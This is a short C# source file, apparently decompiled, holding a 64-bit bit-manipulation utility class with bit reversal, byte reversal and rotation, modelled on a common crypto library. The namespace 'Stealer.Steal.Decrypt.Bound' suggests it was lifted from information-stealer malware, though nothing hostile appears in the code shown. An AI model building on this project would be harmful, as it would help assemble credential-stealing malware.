using System;

namespace Stealer.Steal.Decrypt.Bound;

public abstract class Longs
{
	public const int NumBits = 64;

	public const int NumBytes = 8;

	[CLSCompliant(false)]
	public static ulong Reverse(ulong i)
	{
		i = Bits.BitPermuteStepSimple(i, 6148914691236517205uL, 1);
		i = Bits.BitPermuteStepSimple(i, 3689348814741910323uL, 2);
		i = Bits.BitPermuteStepSimple(i, 1085102592571150095uL, 4);
		return ReverseBytes(i);
	}

	[CLSCompliant(false)]
	public static ulong ReverseBytes(ulong i)
	{
		return RotateLeft(i & 0xFF000000FF000000uL, 8) | RotateLeft(i & 0xFF000000FF0000uL, 24) | RotateLeft(i & 0xFF000000FF00uL, 40) | RotateLeft(i & 0xFF000000FFuL, 56);
	}

	[CLSCompliant(false)]
	public static ulong RotateLeft(ulong i, int distance)
	{
		return (i << distance) ^ (i >> -distance);
	}
}
